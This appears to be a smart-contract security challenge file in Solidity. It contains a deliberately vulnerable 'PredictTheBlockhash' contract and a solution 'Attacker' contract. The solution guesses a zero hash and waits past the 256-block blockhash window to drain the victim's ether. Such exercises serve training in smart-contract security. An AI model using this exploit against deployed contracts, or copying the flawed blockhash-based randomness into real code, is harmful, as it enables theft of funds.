// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

//Challenge
contract PredictTheBlockhash {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether, "Must send 1 ether");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "Requires msg.sender  to be guesser");
        require(block.number > settlementBlockNumber, "Requires block.number to be greater than settlementBlockNumber");

        bytes32 answer = blockhash(settlementBlockNumber);

        guesser = address(0);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }
}

/** CODE YOUR SOLUTION HERE */
contract Attacker {
    PredictTheBlockhash public victim;
    uint256 public settlementBlock;

    constructor(PredictTheBlockhash _victim) {
        victim = PredictTheBlockhash(_victim);
    }

    function attack() public payable {
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");
        victim.lockInGuess{value: msg.value}(bytes32(0));
        settlementBlock = block.number + 1;
    }

    function settle() public {
        require(block.number > settlementBlock, "Wait 256 blocks!");
        victim.settle();
    }

    receive() external payable {}
}